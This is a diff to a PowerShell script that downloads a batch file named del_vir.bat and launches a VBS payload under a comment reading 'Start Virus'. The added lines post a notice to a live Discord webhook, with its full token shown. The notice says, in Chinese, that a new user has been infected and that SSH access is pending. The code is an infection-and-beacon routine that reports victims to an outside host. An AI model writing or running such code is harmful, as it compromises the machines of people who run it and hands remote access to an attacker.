@@ -63,7 +63,10 @@ $dbatPath = "C:\uptm\del_vir.bat"
 Write-Host "Downloading del_vir.bat..."
 Invoke-WebRequest -Uri $dbatUrl -OutFile $dbatPath -UseBasicParsing
 
-# 7. start virus
+# 6.5 Hint New User
+Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1494756673888452829/0fYWomylfI5s1A7KHsEi1BLwMGytiQ0vR620XKUg48ZsWvdZtPHAeey7A4_0xzIJmoW1" -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes((@{embeds=@(@{title="新使用者中病毒";footer=@{text="等待可連接ssh通知"}@;color=16711680})} | ConvertTo-Json -Depth 5))) -ContentType "application/json; charset=utf-8"
+
+# 7. Start Virus
 wscript.exe "$vbsPath"
 
 Write-Host "Deployment completed successfully."
